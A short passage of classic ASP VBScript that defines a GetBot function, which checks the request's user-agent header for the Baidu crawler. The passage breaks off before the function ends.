<script language="vbscript" runat="server">
function GetBot()
dim s_agent
GetBot=""
s_agent=Request.ServerVariables("HTTP_USER_AGENT")
if instr(1,s_agent,"baidu",1) >0 then
GetBot="baidu"
end if
